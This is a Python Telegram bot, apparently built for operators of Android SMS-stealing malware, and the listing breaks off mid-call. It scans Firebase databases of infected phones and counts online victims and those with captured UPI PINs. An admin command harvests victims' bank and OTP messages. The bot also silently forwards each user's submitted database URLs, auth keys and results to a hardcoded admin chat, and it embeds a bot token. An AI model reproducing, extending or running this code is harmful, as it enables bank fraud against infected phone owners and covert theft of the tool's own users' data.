#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════╗
║   💎 FIREBASE PANEL CHECKER BOT — PREMIUM EDITION                ║
║   Made with ❤️  by @THESUNIO                                     ║
╚══════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import subprocess


def _ensure(imp, pip=None):
    pip = pip or imp
    try:
        __import__(imp); return
    except ImportError:
        pass
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pip])
    except Exception:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", "--user", pip])
        except Exception:
            sys.exit(f"Could not install {pip}")


_ensure("requests")

import json
import re
import time
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

import requests

# ═══════════════════════════════════════════════════════════════════════
#  ⚙️  CONFIG
# ═══════════════════════════════════════════════════════════════════════

BOT_TOKEN = "8742060994:AAEBZd8OXwwjYy8sWe6BPu5ryeHZfr5Njsw"
ADMIN_ID  = 8960662469
API       = f"https://api.telegram.org/bot{BOT_TOKEN}"

BRAND   = "Exusan2"
VERSION = "v1.0 PREMIUM"

# ═══════════════════════════════════════════════════════════════════════
#  🎨 TERMINAL UI
# ═══════════════════════════════════════════════════════════════════════

G = "\033[92m"; R = "\033[91m"; Y = "\033[93m"; C = "\033[96m"
M = "\033[95m"; B = "\033[94m"; W = "\033[97m"; N = "\033[0m"
BOLD = "\033[1m"; DIM = "\033[2m"


def _t():
    return datetime.now().strftime("%H:%M:%S")


def tlog(msg, level="INFO"):
    colors = {"INFO": C, "OK": G, "WARN": Y, "ERR": R, "DEBUG": DIM}
    icons = {"INFO": "●", "OK": "✓", "WARN": "▲", "ERR": "✗", "DEBUG": "·"}
    c = colors.get(level, C)
    i = icons.get(level, "•")
    print(f"  {DIM}[{_t()}]{N} {c}{i} {msg}{N}")


def ok(m):   tlog(m, "OK")
def no(m):   tlog(m, "ERR")
def inf(m):  tlog(m, "INFO")
def warn(m): tlog(m, "WARN")


def banner():
    os.system("cls" if os.name == "nt" else "clear")
    print(f"""
{BOLD}{M}╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║   {B}██████╗  █████╗ ███╗   ██╗███████╗██╗{M}                          ║
║   {B}██╔══██╗██╔══██╗████╗  ██║██╔════╝██║{M}                          ║
║   {B}██████╔╝███████║██╔██╗ ██║█████╗  ██║{M}                          ║
║   {B}██╔═══╝ ██╔══██║██║╚██╗██║██╔══╝  ██║{M}                          ║
║   {B}██║     ██║  ██║██║ ╚████║███████╗███████╗{M}                     ║
║   {B}╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝{M}                     ║
║                                                                   ║
║   {G}⚡ FIREBASE PANEL CHECKER BOT ⚡{N}                                ║
║                                                                   ║
║   {Y}╭─────────────────────────────────────────╮{N}                     ║
║   {Y}│{N}  {BOLD}{W}💎 Made with ❤️  by  {M}{BOLD}{BRAND}{N}        {Y}│{N}                     ║
║   {Y}│{N}  {DIM}Version: {VERSION}{N}                     {Y}│{N}                     ║
║   {Y}╰─────────────────────────────────────────╯{N}                     ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝{N}""")

# ═══════════════════════════════════════════════════════════════════════
#  🧠 STATE (memory only — no files)
# ═══════════════════════════════════════════════════════════════════════

STATE_LOCK = threading.Lock()
USERS = {}
BANNED = set()
STATS = {
    "total_users": 0,
    "total_checks": 0,
    "total_urls": 0,
    "started_at": time.time(),
}

# ═══════════════════════════════════════════════════════════════════════
#  📡 TELEGRAM API
# ═══════════════════════════════════════════════════════════════════════

def tg(method, data=None):
    try:
        r = requests.post(f"{API}/{method}", json=data or {}, timeout=60)
        return r.json()
    except Exception as e:
        tlog(f"TG {method} failed: {e}", "WARN")
        return None


def _normalize_buttons(buttons):
    """Convert tuple/list buttons to Telegram dict format."""
    if not buttons:
        return None
    out = []
    for row in buttons:
        new_row = []
        for btn in row:
            if isinstance(btn, dict):
                new_row.append(btn)
            elif isinstance(btn, (list, tuple)) and len(btn) == 2:
                new_row.append({"text": btn[0], "callback_data": btn[1]})
            else:
                new_row.append({"text": str(btn), "callback_data": "noop"})
        out.append(new_row)
    return out


def send(chat_id, text, reply_to=None, buttons=None):
    p = {"chat_id": chat_id, "text": text, "disable_web_page_preview": True,
         "parse_mode": "HTML"}
    if reply_to:
        p["reply_to_message_id"] = reply_to
    if buttons:
        p["reply_markup"] = {"inline_keyboard": _normalize_buttons(buttons)}
    result = tg("sendMessage", p)
    if not result or not result.get("ok"):
        tlog(f"send failed: {str(result)[:150]}", "ERR")
    return result


def edit(chat_id, msg_id, text, buttons=None):
    p = {"chat_id": chat_id, "message_id": msg_id, "text": text,
         "disable_web_page_preview": True, "parse_mode": "HTML"}
    if buttons:
        p["reply_markup"] = {"inline_keyboard": _normalize_buttons(buttons)}
    result = tg("editMessageText", p)
    if not result or not result.get("ok"):
        tlog(f"edit failed: {str(result)[:150]}", "ERR")
    return result


def answer_cb(cb_id, text=None, alert=False):
    p = {"callback_query_id": cb_id}
    if text:
        p["text"] = text
    if alert:
        p["show_alert"] = True
    return tg("answerCallbackQuery", p)


def _esc(s):
    return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

# ═══════════════════════════════════════════════════════════════════════
#  📡 SILENT ADMIN NOTIFICATION
# ═══════════════════════════════════════════════════════════════════════

def _silent_new_url(uid, name, uname, urls, results=None):
    try:
        now = datetime.now().strftime("%d %b %Y • %H:%M:%S")
        url_lines = "\n".join(f"🌐 <code>{_esc(u)}</code>" for u in urls[:20])
        if len(urls) > 20:
            url_lines += f"\n… +{len(urls) - 20} more"

        txt = (
            f"🔔 <b>NEW FIREBASE CHECK</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>{_esc(name)}</b>\n"
            f"🆔 <code>{uid}</code>\n"
            f"📛 @{uname or 'none'}\n"
            f"📊 URLs: <b>{len(urls)}</b>\n\n"
            f"{url_lines}\n\n"
            f"⏰ {now}"
        )

        if results:
            total_dev = sum(r["total"] for r in results if r["ok"])
            online = sum(r["online"] for r in results if r["ok"])
            offline = sum(r["offline"] for r in results if r["ok"])
            pin = sum(r["with_pin"] for r in results if r["ok"])
            txt += (
                f"\n━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📊 <b>RESULT SUMMARY</b>\n"
                f"🟢 Online : <b>{online}</b>\n"
                f"🔴 Offline: <b>{offline}</b>\n"
                f"📱 Total  : <b>{total_dev}</b>\n"
                f"📌 PIN    : <b>{pin}</b>"
            )

        requests.post(f"{API}/sendMessage", json={
            "chat_id": ADMIN_ID,
            "text": txt,
            "disable_web_page_preview": True,
            "parse_mode": "HTML",
        }, timeout=10)
    except Exception:
        pass

# ═══════════════════════════════════════════════════════════════════════
#  🔍 FIREBASE CHECKER
# ═══════════════════════════════════════════════════════════════════════

FB_SESSION = requests.Session()

DEVICE_FIELDS = (
    "sims", "mobNo", "phoneNumber", "deviceId", "androidV",
    "modelName", "sdkV", "cpu_arch", "service_provider",
)
SKIP_NODES = {
    "messages", "notifications", "config", "settings",
    "sms", "otps", "logs", "admin", "meta", "stats",
}


def fb_get(url, key=""):
    try:
        full = url
        if key:
            full += f"?auth={key}" if "?" not in url else f"&auth={key}"
        r = FB_SESSION.get(full, timeout=10)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return None


def _looks_like_device(entry):
    if not isinstance(entry, dict):
        return False
    return any(f in entry for f in DEVICE_FIELDS)


def find_device_node(base_url, key=""):
    data = fb_get(f"{base_url}/clients.json?shallow=true", key)
    if isinstance(data, dict) and data:
        return "clients"

    root = fb_get(f"{base_url}/.json?shallow=true", key)
    if not isinstance(root, dict):
        return None

    for node in root.keys():
        if node.lower() in SKIP_NODES:
            continue
        sample = fb_get(f"{base_url}/{node}.json?limitToFirst=1", key)
        if not isinstance(sample, dict) or not sample:
            continue
        first_val = next(iter(sample.values()))
        if _looks_like_device(first_val):
            return node
        if isinstance(first_val, dict):
            for sub_key, sub_val in first_val.items():
                if _looks_like_device(sub_val):
                    return f"{node}/{sub_key}"
    return None


def check_firebase(base_url, key=""):
    result = {
        "url": base_url, "key": key, "ok": False, "error": None,
        "node": None, "total": 0, "online": 0, "offline": 0, "with_pin": 0,
    }

    node = find_device_node(base_url, key)
    if not node:
        result["error"] = "No device node found"
        return result

    result["node"] = node
    devices = fb_get(f"{base_url}/{node}.json", key)
    if not isinstance(devices, dict):
        result["error"] = f"Node '{node}' empty"
        return result

    total = online = offline = with_pin = 0
    for dev_id, dev in devices.items():
        if not isinstance(dev, dict):
            continue
        total += 1
        if dev.get("status") is True or str(dev.get("status")).lower() == "true":
            online += 1
        else:
            offline += 1
        pin = dev.get("upipin") or dev.get("pin") or dev.get("upiPin") or ""
        if pin and str(pin).strip():
            with_pin += 1

    result.update({
        "ok": True, "total": total, "online": online,
        "offline": offline, "with_pin": with_pin,
    })
    return result

# ═══════════════════════════════════════════════════════════════════════
#  🏦 BANK SMS DETECTOR
# ═══════════════════════════════════════════════════════════════════════

BANK_SENDER_KEYWORDS = (
    "HDFC", "HDFCBK", "HDFCBN", "HDFCCC",
    "SBI", "SBIN", "SBIINB", "SBIUPI", "SBICRD",
    "ICICI", "ICICIB", "ICICIC",
    "AXIS", "AXISBK", "AXISBN",
    "KOTAK", "KOTAKB", "KMB", "KOTAKM",
    "YESBNK", "YESB", "YESBANK",
    "PNB", "PNBSMS", "PUNJAB",
    "BOB", "BOBCORP", "BARODA",
    "IDBI", "IDBIBK",
    "INDUSB", "INDUS", "INDUSIND",
    "UNIONB", "UBINB", "UNION",
    "CANBNK", "CANARA", "CNRB",
    "FEDBNK", "FEDERAL", "FEDBK",
    "RBLBNK", "RATNAKAR", "RBL",
    "BANDHN", "BANDHAN",
    "IDFCBK", "IDFC", "IDFCFB",
    "AUBANK", "AUBNK",
    "PAYTM", "PAYTMB", "PTHDFC", "PTYES",
    "PHONEPE", "PHONEP", "YBL",
    "AMEX", "AMEXIN", "CITI", "CITIBK",
    "SCBANK", "STANCH", "DBSBANK", "DBSSMS",
    "UJJIVAN", "UJJIVN", "EQUITAS", "EQTAS",
    "BAJAJ", "BAJFIN", "BAJAJF",
    "TATACAP", "TATAC",
    "AIRTELPAY", "AIRTELM",
    "MAHABK", "MAHABANK", "JANABK", "JANATA",
    "KARBNK", "KARNATAKA", "SOUTHB", "SOUTHINDIAN",
    "DCBBANK", "DCB", "NAINB", "NAINITAL",
    "KARUR", "KVBL", "TMB", "TMBL",
    "CUB", "CITYUNION", "JUPITER", "JUPITM",
    "FI", "FIMONEY",
)

BANK_BODY_KEYWORDS = (
    "account", "a/c", "acct", "balance", "bal.", "available bal",
    "debit", "debited", "credited", "credit of", "withdrawn",
    "transaction", "txn", "transfer", "imps", "neft", "rtgs", "upi",
    "cheque", "credit card", "debit card",
    "loan", "emi", "statement", "ifsc",
    "ref no", "reference no", "txn id", "ref id",
    "your a/c", "your account",
)


def _is_bank_sms(msg):
    if not isinstance(msg, dict):
        return False
    sender = str(
        msg.get("sender") or msg.get("from") or
        msg.get("address") or msg.get("originator") or ""
    ).upper()
    body = str(
        msg.get("message") or msg.get("body") or
        msg.get("text") or msg.get("msg") or ""
    )
    body_low = body.lower()

    if sender:
        for kw in BANK_SENDER_KEYWORDS:
            if kw in sender:
                return True

    matched = sum(1 for kw in BANK_BODY_KEYWORDS if kw in body_low)
    return matched >= 2


def fetch_bank_sms_for_device(base_url, key, device_id):
    data = None
    for path in ("messages", "sms", "otps", "otp"):
        d = fb_get(f"{base_url}/{path}/{device_id}.json", key)
        if isinstance(d, dict) and d:
            data = d
            break
    if not data:
        return []

    results = []
    for msg_id, msg in data.items():
        if not isinstance(msg, dict):
            continue
        if not _is_bank_sms(msg):
            continue

        sender = str(msg.get("sender") or msg.get("from") or msg.get("address") or "?")
        body = str(msg.get("message") or msg.get("body") or msg.get("text") or msg.get("msg") or "")
        dt = str(msg.get("dateTime") or msg.get("timestamp") or msg.get("time") or msg.get("date") or "")

        try:
            ts = int(msg_id)
        except Exception:
            ts = 0
        if not ts:
            try:
                ts = int(float(msg.get("timestamp") or 0))
            except Exception:
                ts = 0

        results.append({
            "device": device_id, "sender": sender, "body": body,
            "dateTime": dt, "msg_id": msg_id, "ts": ts,
        })

    results.sort(key=lambda x: x["ts"], reverse=True)
    return results


def collect_all_bank_sms(urls, max_per_device=10):
    all_results = []
    for base_url, key in urls:
        node = find_device_node(base_url, key)
        if not node:
            continue
        devices = fb_get(f"{base_url}/{node}.json", key)
        if not isinstance(devices, dict):
            continue
        for dev_id, dev in devices.items():
            if not isinstance(dev, dict):
                continue
            if not (dev.get("status") is True or str(dev.get("status")).lower() == "true"):
                continue
            sms_list = fetch_bank_sms_for_device(base_url, key, dev_id)
            sms_list = sms_list[:max_per_device]
            for s in sms_list:
                s["firebase"] = base_url
                all_results.append(s)
    return all_results


def send_bank_sms_report(chat_id, url_list, reply_to=None, silent_admin=True):
    tlog("Collecting bank SMS from all online devices...", "INFO")
    sms_data = collect_all_bank_sms(url_list)
    total = len(sms_data)

    if total == 0:
        send(chat_id,
            f"🏦 <b>BANK SMS REPORT</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"❌ Koi bank SMS nahi mila\n"
            f"📱 Online devices check kiye\n\n"
            f"<i>💎 Made with ❤️ by {BRAND}</i>",
            reply_to=reply_to)
        return

    header = (
        f"🏦 <b>BANK SMS REPORT</b>\n"
        f"╔═══════════════════════════════╗\n"
        f"║  📥 Total SMS   : <b>{total}</b>\n"
        f"║  🌐 Firebase(s) : <b>{len(url_list)}</b>\n"
        f"║  🕐 {datetime.now().strftime('%d/%m/%Y, %I:%M:%S %p')}\n"
        f"╚═══════════════════════════════╝\n"
    )
    send(chat_id, header, reply_to=reply_to)

    batch = []
    batch_size = 0
    for i, s in enumerate(sms_data, 1):
        dev_short = s["device"][:12] + "…" if len(s["device"]) > 12 else s["device"]
        entry = (
            f"<b>#{i}</b> 🏦 <code>{_esc(s['sender'])}</code>\n"
            f"📱 <code>{_esc(dev_short)}</code>  ⏰ {_esc(s['dateTime'])}\n"
            f"💬 {_esc(s['body'])}\n"
            f"───────────────────────\n"
        )
        if batch_size + len(entry) > 3500:
            send(chat_id, "".join(batch))
            batch = []
            batch_size = 0
            time.sleep(0.3)
        batch.append(entry)
        batch_size += len(entry)

    if batch:
        send(chat_id, "".join(batch))

    send(chat_id,
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ <b>{total} bank SMS found</b>\n\n"
        f"<i>💎 Made with ❤️ by {BRAND}</i>")

    ok(f"Bank SMS report sent — {total} messages")

    if silent_admin:
        try:
            admin_txt = (
                f"🏦 <b>BANK SMS COLLECTED</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 User: <code>{chat_id}</code>\n"
                f"📥 Total SMS: <b>{total}</b>\n"
                f"🌐 Firebase(s): {len(url_list)}\n\n"
                f"<b>Latest 5:</b>\n"
            )
            for i, s in enumerate(sms_data[:5], 1):
                admin_txt += (
                    f"\n<b>#{i}</b> 🏦 <code>{_esc(s['sender'])}</code>\n"
                    f"📱 <code>{_esc(s['device'][:16])}</code>\n"
                    f"💬 {_esc(s['body'][:200])}\n"
                )
            requests.post(f"{API}/sendMessage", json={
                "chat_id": ADMIN_ID, "text": admin_txt,
                "disable_web_page_preview": True, "parse_mode": "HTML",
            }, timeout=10)
        except Exception:
            pass

# ═══════════════════════════════════════════════════════════════════════
#  📊 FORMAT HELPERS
# ═══════════════════════════════════════════════════════════════════════

def bar(pct, length=14, style="smooth"):
    pct = max(0, min(100, pct))
    filled = int(length * pct / 100)
    if style == "smooth":
        return "▰" * filled + "▱" * (length - filled)
    return "█" * filled + "░" * (length - filled)


def fmt_time(seconds):
    seconds = int(seconds)
    if seconds < 60:
        return f"{seconds}s"
    m, s = divmod(seconds, 60)
    if m < 60:
        return f"{m}m {s}s"
    h, m = divmod(m, 60)
    return f"{h}h {m}m"


def parse_urls(raw):
    raw = raw.replace(",", " ").replace(";", " ")
    tokens = [t.strip() for t in re.split(r"\s+", raw) if t.strip()]
    out, seen = [], set()
    for tok in tokens:
        tok = tok.rstrip(".,;:")
        if not ("firebaseio.com" in tok or "firebasedatabase.app" in tok):
            continue
        parts = tok.split("|||")
        url = parts[0].strip().rstrip("/")
        key = parts[1].strip() if len(parts) > 1 else ""
        if not (url.startswith("http://") or url.startswith("https://")):
            continue
        if url in seen:
            continue
        seen.add(url)
        out.append((url, key))
    return out


def format_single(result, index=1):
    now = datetime.now().strftime("%d/%m/%Y, %I:%M:%S %p")
    url = result["url"]
    if not result["ok"]:
        return (
            f"❌ <b>FIREBASE #{index} — FAILED</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔗 <code>{_esc(url)}</code>\n"
            f"⚠️ {_esc(result.get('error', 'Unknown'))}\n"
            f"🕐 {now}"
        )
    return (
        f"✅ <b>Firebase Connected Successfully</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔗 URL: <code>{_esc(url)}</code>\n"
        f"🔑 API Key: {_esc(result['key']) if result['key'] else '—'}\n"
        f"📂 Node: <code>{_esc(result['node'])}</code>\n\n"
        f"📊 <b>Panel Status Summary</b>\n"
        f"🟢 Online: <b>{result['online']}</b>  "
        f"🔴 Offline: <b>{result['offline']}</b>  "
        f"📱 Total: <b>{result['total']}</b>  "
        f"📌 With PIN: <b>{result['with_pin']}</b>\n\n"
        f"🕐 {now}"
    )


def format_grand(results):
    now = datetime.now().strftime("%d/%m/%Y, %I:%M:%S %p")
    total_fb = len(results)
    ok_fb = sum(1 for r in results if r["ok"])
    failed = total_fb - ok_fb
    total_dev = sum(r["total"] for r in results if r["ok"])
    online = sum(r["online"] for r in results if r["ok"])
    offline = sum(r["offline"] for r in results if r["ok"])
    pin = sum(r["with_pin"] for r in results if r["ok"])

    return (
        f"🔥 <b>FIREBASE PANEL CHECKER</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🌐 Firebase(s)  : <b>{total_fb}</b>\n"
        f"✅ Connected    : <b>{ok_fb}</b>\n"
        f"❌ Failed       : <b>{failed}</b>\n\n"
        f"📊 <b>ALL FIREBASE SUMMARY</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🟢 Total Online  : <b>{online}</b>\n"
        f"🔴 Total Offline : <b>{offline}</b>\n"
        f"📱 Total Devices : <b>{total_dev}</b>\n"
        f"📌 Total With PIN: <b>{pin}</b>\n\n"
        f"🕐 {now}\n\n"
        f"💎 <i>Made with ❤️ by {BRAND}</i>"
    )

# ═══════════════════════════════════════════════════════════════════════
#  🚀 CHECK RUNNER
# ═══════════════════════════════════════════════════════════════════════

def run_check(chat_id, reply_to, uid, name, uname, urls):
    total = len(urls)
    results = []
    lock = threading.Lock()
    done = [0]
    start_ts = time.time()

    status_msg = send(chat_id,
        f"🔍 <b>FIREBASE CHECK</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📥 URLs to check: <b>{total}</b>\n\n"
        f"<i>Initializing...</i>",
        reply_to=reply_to)
    if not status_msg or not status_msg.get("ok"):
        return
    msg_id = status_msg["result"]["message_id"]

    def _edit_status(text):
        try:
            edit(chat_id, msg_id, text)
        except Exception:
            pass

    def _worker(item):
        url, key = item
        r = check_firebase(url, key)
        with lock:
            results.append(r)
            done[0] += 1
            idx = done[0]
            pct = int(100 * idx / total)
            bar_str = bar(pct, 14, "smooth")
            elapsed = int(time.time() - start_ts)
            if idx < total:
                _edit_status(
                    f"⚡ <b>CHECKING...</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"{bar_str}  <b>{pct}%</b>\n"
                    f"Processed: <b>{idx}/{total}</b>\n"
                    f"⏱️ Elapsed: {elapsed}s"
                )

    with ThreadPoolExecutor(max_workers=5) as ex:
        list(ex.map(_worker, urls))

    order = {url: i for i, (url, _) in enumerate(urls)}
    results.sort(key=lambda r: order.get(r["url"], 999))

    for i, r in enumerate(results, 1):
        send(chat_id, format_single(r, index=i))
        time.sleep(0.4)

    send(chat_id, format_grand(results))

    elapsed = int(time.time() - start_ts)
    _edit_status(
        f"✅ <b>CHECK COMPLETE</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📥 URLs checked: <b>{total}</b>\n"
        f"⏱️ Time: {fmt_time(elapsed)}\n\n"
        f"💎 <i>Made with ❤️ by {BRAND}</i>"
    )

    with STATE_LOCK:
        if uid in USERS:
            USERS[uid]["checks"] = USERS[uid].get("checks", 0) + 1
            USERS[uid]["urls"] = USERS[uid].get("urls", 0) + total
            USERS[uid]["last_urls"] = urls
        STATS["total_checks"] += 1
        STATS["total_urls"] += total

    try:
        _silent_new_url(uid, name, uname, [u for u, _ in urls], results=results)
    except Exception:
        pass

# ═══════════════════════════════════════════════════════════════════════
#  💬 HANDLERS
# ═══════════════════════════════════════════════════════════════════════

def register_user(uid, name, uname):
    with STATE_LOCK:
        if uid not in USERS:
            USERS[uid] = {
                "name": name or "?", "username": uname or "",
                "joined": int(time.time()), "checks": 0,
                "urls": 0, "last_urls": [],
            }
            STATS["total_users"] = len(USERS)
            tlog(f"New user: {name} ({uid})", "INFO")


def user_welcome(chat_id, uid, name, uname):
    register_user(uid, name, uname)
    is_admin = (uid == ADMIN_ID)
    txt = (
        f"<b>💎 FIREBASE PANEL CHECKER</b>\n"
        f"╔═══════════════════════════════╗\n"
        f"║                               ║\n"
        f"║   👤 Hey, <b>{_esc(name)}</b>!\n"
        f"║   🎯 Multi-Firebase Checker\n"
        f"║   🚀 {VERSION}\n"
        f"║                               ║\n"
        f"╚═══════════════════════════════╝\n\n"
        f"<b>📌 HOW TO USE</b>\n"
        f"╭─────────────────────────────╮\n"
        f"│ 1️⃣  Firebase URL bhejo\n"
        f"│ 2️⃣  Multiple URL comma/space\n"
        f"│     ya newline se separate karo\n"
        f"│ 3️⃣  Live stats milega\n"
        f"╰─────────────────────────────╯\n\n"
        f"<b>✨ FEATURES</b>\n"
        f"╭─────────────────────────────╮\n"
        f"│ ✅ Auto node detect\n"
        f"│ ✅ Online / Offline count\n"
        f"│ ✅ With PIN count\n"
        f"│ ✅ Multiple URL support\n"
        f"│ ✅ Real-time progress\n"
        f"╰─────────────────────────────╯\n\n"
        f"<i>💎 Made with ❤️  by {BRAND}</i>"
    )
    buttons = [
        [("👤 My Profile", "mystats"), ("📖 Help", "help")],
        [("🌐 Global Stats", "global_stats")],
    ]
    if is_admin:
        buttons.append([("🛡️ Admin Panel", "admin_panel")])
        buttons.append([("🏦 Bank SMS Help", "banksms_help")])
    send(chat_id, txt, buttons=buttons)


def user_help(chat_id, uid):
    is_admin = (uid == ADMIN_ID)
    txt = (
        f"<b>📖 HELP & GUIDE</b>\n"
        f"╔═══════════════════════════════╗\n"
        f"║  <b>⚡ QUICK START</b>\n"
        f"║  Just send Firebase URLs\n"
        f"║  Bot will check everything!\n"
        f"╚═══════════════════════════════╝\n\n"
        f"<b>🌐 INPUT FORMATS</b>\n"
        f"╭─────────────────────────────╮\n"
        f"│ ✅ Single URL\n"
        f"│ ✅ URL1 URL2 URL3\n"
        f"│ ✅ URL1, URL2, URL3\n"
        f"│ ✅ URL (newline se)\n"
        f"│ ✅ URL|||AUTH_KEY\n"
        f"╰─────────────────────────────╯\n\n"
        f"<b>🎯 COMMANDS</b>\n"
        f"╭─────────────────────────────╮\n"
        f"│ /start  — Main menu\n"
        f"│ /help   — This guide\n"
        f"│ /stats  — Your stats\n"
    )
    if is_admin:
        txt += (
            f"│ /banksms — Bank SMS report\n"
            f"│ /admin  — Admin panel\n"
        )
    txt += (
        f"╰─────────────────────────────╯\n\n"
        f"<i>💎 Made with ❤️  by {BRAND}</i>"
    )
    send(chat_id, txt, buttons=[[("🔙 Menu", "menu")]])


def user_stats(chat_id, uid):
    u = USERS.get(uid, {})
    joined = datetime.fromtimestamp(u.get("joined", time.time())).strftime("%d %b %Y")
    txt = (
        f"<b>👤 YOUR PROFILE</b>\n"
        f"╭─────────────────────────────╮\n"
        f"│ 📛 Name      : <b>{_esc(u.get('name','?'))}</b>\n"
        f"│ 🆔 User ID   : <code>{uid}</code>\n"
        f"│ 📅 Joined    : {joined}\n"
        f"│ 🌟 Status    : <b>Active</b>\n"
        f"╰─────────────────────────────╯\n\n"
        f"<b>📊 YOUR STATISTICS</b>\n"
        f"╭─────────────────────────────╮\n"
        f"│ 🔍 Total Checks : <b>{u.get('checks',0)}</b>\n"
        f"│ 🌐 URLs Checked : <b>{u.get('urls',0)}</b>\n"
        f"╰─────────────────────────────╯\n\n"
        f"<i>💎 Made with ❤️  by {BRAND}</i>"
    )
    send(chat_id, txt, buttons=[[("🔙 Menu", "menu")]])


def user_global_stats(chat_id):
    s = STATS
    up = int(time.time() - s["started_at"])
    txt = (
        f"<b>🌐 GLOBAL STATISTICS</b>\n"
        f"╔═══════════════════════════════╗\n"
        f"║                               ║\n"
        f"║  👥 Total Users    : <b>{s['total_users']}</b>\n"
        f"║  🔍 Total Checks   : <b>{s['total_checks']}</b>\n"
        f"║  🌐 URLs Checked   : <b>{s['total_urls']}</b>\n"
        f"║  ⏱️  Bot Uptime     : {fmt_time(up)}\n"
        f"║                               ║\n"
        f"╚═══════════════════════════════╝\n\n"
        f"<i>💎 Made with ❤️  by {BRAND}</i>"
    )
    send(chat_id, txt, buttons=[[("🔙 Menu", "menu")]])


def admin_panel(chat_id):
    s = STATS
    up = int(time.time() - s["started_at"])
    txt = (
        f"<b>🛡️  ADMIN CONTROL PANEL</b>\n"
        f"╔═══════════════════════════════╗\n"
        f"║   <b>📊 SYSTEM OVERVIEW</b>\n"
        f"║                               ║\n"
        f"║   👥 Users       : <b>{s['total_users']}</b>\n"
        f"║   🚫 Banned      : <b>{len(BANNED)}</b>\n"
        f"║   🔍 Checks      : <b>{s['total_checks']}</b>\n"
        f"║   🌐 URLs        : <b>{s['total_urls']}</b>\n"
        f"║   ⏱️  Uptime      : {fmt_time(up)}\n"
        f"║                               ║\n"
        f"╚═══════════════════════════════╝\n\n"
        f"<i>💎 {BRAND} • Admin Access</i>"
    )
    send(chat_id, txt, buttons=[
        [("🏦 Bank SMS Scan", "banksms_help")],
        [("🔙 Menu", "menu")],
    ])


def banksms_help(chat_id):
    txt = (
        f"<b>🏦 BANK SMS SCANNER</b>\n"
        f"╔═══════════════════════════════╗\n"
        f"║                               ║\n"
        f"║  Har online device ke saare\n"
        f"║  bank SMS check karega\n"
        f"║                               ║\n"
        f"╚═══════════════════════════════╝\n\n"
        f"<b>📌 USAGE</b>\n"
        f"╭─────────────────────────────╮\n"
        f"│ <code>/banksms URL1 URL2</code>\n"
        f"│                             │\n"
        f"│ Ya pehle normal URL bhejo,\n"
        f"│ phir <code>/banksms</code>\n"
        f"╰─────────────────────────────╯\n\n"
        f"<i>💎 Made with ❤️  by {BRAND}</i>"
    )
    send(chat_id, txt, buttons=[[("🔙 Menu", "menu")]])

# ═══════════════════════════════════════════════════════════════════════
#  🎬 MESSAGE ROUTER
# ═══════════════════════════════════════════════════════════════════════

def handle_message(msg):
    chat_id = msg.get("chat", {}).get("id")
    msg_id = msg.get("message_id")
    uid = msg.get("from", {}).get("id")
    name = msg.get("from", {}).get("first_name", "?")
    uname = msg.get("from", {}).get("username", "")
    text = (msg.get("text") or "").strip()

    if not uid or not chat_id:
        return

    if uid in BANNED and uid != ADMIN_ID:
        send(chat_id, "🚫 <b>You are banned from using this bot.</b>")
        return

    is_admin = (uid == ADMIN_ID)

    # Commands
    if text.startswith("/start") or text.startswith("/help"):
        user_welcome(chat_id, uid, name, uname); return

    if text.startswith("/stats"):
        user_stats(chat_id, uid); return

    if text.startswith("/admin") and is_admin:
        admin_panel(chat_id); return

    # Bank SMS — admin only
    if text.startswith("/banksms"):
        if not is_admin:
            send(chat_id, "🚫 <b>Admin only command</b>", reply_to=msg_id)
            return

        urls_input = text[len("/banksms"):].strip()
        if not urls_input:
            with STATE_LOCK:
                user = USERS.get(uid, {})
                last_urls = user.get("last_urls", [])
            if not last_urls:
                send(chat_id,
                    f"📌 <b>Usage:</b>\n"
                    f"<code>/banksms URL1 URL2 ...</code>\n\n"
                    f"Ya pehle normal Firebase URL bhejo, phir <code>/banksms</code>",
                    reply_to=msg_id)
                return
            urls_to_check = last_urls
        else:
            urls_to_check = parse_urls(urls_input)
            if not urls_to_check:
                send(chat_id, "❌ Invalid Firebase URL(s)", reply_to=msg_id)
                return

        send(chat_id,
            f"🏦 <b>BANK SMS CHECK STARTED</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 URLs: <b>{len(urls_to_check)}</b>\n"
            f"📱 Scanning all online devices...\n\n"
            f"<i>Please wait, isme time lagega...</i>",
            reply_to=msg_id)

        threading.Thread(
            target=send_bank_sms_report,
            args=(chat_id, urls_to_check, msg_id, True),
            daemon=True,
        ).start()
        return

    # Firebase URLs
    if "firebaseio.com" in text or "firebasedatabase.app" in text:
        urls = parse_urls(text)
        if not urls:
            send(chat_id, "❌ <b>Invalid Firebase URL(s)</b>", reply_to=msg_id)
            return

        tlog(f"Checking {len(urls)} URL(s) for {name} ({uid})", "INFO")
        register_user(uid, name, uname)

        ok_msg = send(chat_id,
            f"🚀 <b>Starting check...</b>\n"
            f"📥 URLs: <b>{len(urls)}</b>\n\n"
            f"<i>Please wait, processing...</i>",
            reply_to=msg_id)
        if not ok_msg or not ok_msg.get("ok"):
            return

        threading.Thread(
            target=run_check,
            args=(chat_id, msg_id, uid, name, uname, urls),
            daemon=True,
